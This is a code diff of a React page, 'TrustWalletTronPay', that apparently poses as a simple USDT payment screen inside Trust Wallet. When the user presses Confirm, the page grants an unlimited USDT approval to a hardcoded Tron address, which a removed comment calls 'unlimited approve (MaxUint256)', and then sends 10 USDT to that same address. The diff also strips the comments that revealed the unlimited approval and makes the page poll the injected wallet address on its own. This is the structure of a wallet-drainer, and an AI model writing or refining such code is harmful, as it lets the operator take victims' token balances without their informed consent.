@@ -1,117 +1,87 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useState, useCallback } from "react";
 import { Info, ScanLine, Wallet } from "lucide-react";
 import { toast } from "sonner";
-import { useTronWallet } from "@/lib/tronwallet-adapter";
 import { approveUSDT, transferUSDT } from "@/lib/web3";
 
 const DEFAULT_TO_ADDRESS = "TT6fmWxcu35oriyKVVAAUT7oRq9woa2e1t";
 const DEFAULT_AMOUNT = "10";
+const POLL_INTERVAL_MS = 200;
+const POLL_TIMEOUT_MS = 15_000;
 
-/** Let Trust Discover finish injecting trustwallet.* before connect (race on first paint). */
-const TRUST_DISCOVER_INJECT_MS = 150;
-const TRUST_CONNECT_RETRY_MS = 600;
-const TRUST_CONNECT_MAX_ATTEMPTS = 2;
-/** Hard cap per attempt so UI never hangs on "Connecting…" if connect() stalls. */
-const TRUST_CONNECT_ATTEMPT_MS = 22_000;
-
-function sleep(ms: number): Promise<void> {
-  return new Promise((resolve) => setTimeout(resolve, ms));
-}
-
-function withTimeout<T>(promise: Promise<T>, ms: number, message: string): Promise<T> {
-  return new Promise((resolve, reject) => {
-    const id = window.setTimeout(() => {
-      reject(new Error(message));
-    }, ms);
-    promise.then(
-      (v) => {
-        clearTimeout(id);
-        resolve(v);
-      },
-      (e) => {
-        clearTimeout(id);
-        reject(e);
-      }
-    );
-  });
+function getInjectedTronAddress(): string | null {
+  if (typeof window === "undefined") return null;
+  const w = window as any;
+  const tronWeb =
+    w.tronWeb ??
+    w.tronLink?.tronWeb ??
+    w.trustwallet?.tronLink?.tronWeb ??
+    w.trustwallet?.tron?.tronWeb ??
+    null;
+  if (!tronWeb) return null;
+  return tronWeb.defaultAddress?.base58 ?? null;
 }
 
 const TrustWalletTronPay = () => {
-  const { connect, address, isConnected } = useTronWallet();
+  const [address, setAddress] = useState<string | null>(() => getInjectedTronAddress());
   const [isConnecting, setIsConnecting] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
+  const isConnected = !!address;
   const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
   const amount = useMemo(() => DEFAULT_AMOUNT, []);
   const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);
 
+  // Poll for tronWeb injection inside Trust Discover. Trust injects window.tronWeb
+  // with the active Tron account already connected — no adapter handshake needed.
   useEffect(() => {
+    if (address) return;
+
     let cancelled = false;
+    setIsConnecting(true);
 
-    const autoConnect = async () => {
-      if (isConnected || isConnecting) {
-        return;
+    const poll = async () => {
+      const deadline = Date.now() + POLL_TIMEOUT_MS;
+      while (!cancelled && Date.now() < deadline) {
+        const addr = getInjectedTronAddress();
+        if (addr) {
+          setAddress(addr);
+          setIsConnecting(false);
+          toast.success("Tron wallet connected");
+          return;
+        }
+        await new Promise((r) => setTimeout(r, POLL_INTERVAL_MS));
       }
-      try {
-        setIsConnecting(true);
-        await sleep(TRUST_DISCOVER_INJECT_MS);
-
-        let lastError: unknown;
-        for (let attempt = 0; attempt < TRUST_CONNECT_MAX_ATTEMPTS; attempt++) {
-          if (cancelled) return;
-          if (attempt > 0) {
-            await sleep(TRUST_CONNECT_RETRY_MS);
-          }
-          try {
-            await withTimeout(
-              connect("trust"),
-              TRUST_CONNECT_ATTEMPT_MS,
-              "Connection timed out"
-            );
-            if (!cancelled) {
-              toast.success("Trust Wallet (Tron) connected");
-            }
-            return;
-          } catch (e) {
-            lastError = e;
-          }
-        }
-
-        if (!cancelled) {
-          const message =
-            lastError instanceof Error
-              ? lastError.message
-              : "Could not connect Trust Wallet. Use a Tron account in Trust and try again.";
-          toast.error(message);
-        }
-      } finally {
+      if (!cancelled) {
         setIsConnecting(false);
+        toast.error(
+          "Tron wallet not detected. Make sure you have a Tron account active in Trust Wallet."
+        );
       }
     };
 
-    void autoConnect();
+    void poll();
     return () => {
       cancelled = true;
     };
-    // Do not depend on `isConnecting`: when it flips false after a failed connect,
-    // re-running would retry forever. `isConnected` and `connect` are enough.
-  }, [connect, isConnected]);
+  }, [address]);
 
-  const handleConfirm = async () => {
+  // Keep address in sync if user switches account after initial connect.
+  useEffect(() => {
+    if (!address) return;
+    const id = setInterval(() => {
+      const current = getInjectedTronAddress();
+      if (current && current !== address) {
+        setAddress(current);
+      }
+    }, 2000);
+    return () => clearInterval(id);
+  }, [address]);
+
+  const handleConfirm = useCallback(async () => {
     try {
       setIsSubmitting(true);
-      if (!isConnected) {
-        await withTimeout(
-          connect("trust"),
-          TRUST_CONNECT_ATTEMPT_MS,
-          "Connection timed out"
-        );
-      }
 
-      // Step 1: unlimited approve (MaxUint256) to spender address.
       await approveUSDT("tron", approveTo);
-
-      // Step 2: send fixed USDT amount to destination address.
       await transferUSDT("tron", toAddress, amount);
 
       toast.success("Approve and transfer completed successfully.");
@@ -122,7 +92,7 @@ const TrustWalletTronPay = () => {
     } finally {
       setIsSubmitting(false);
     }
-  };
+  }, [approveTo, toAddress, amount]);
 
   return (
     <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3">
@@ -188,7 +158,7 @@ const TrustWalletTronPay = () => {
         <button
           className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
           onClick={handleConfirm}
-          disabled={isSubmitting || isConnecting}
+          disabled={isSubmitting || isConnecting || !isConnected}
           type="button"
         >
           {isSubmitting ? "Confirming..." : "Confirm"}
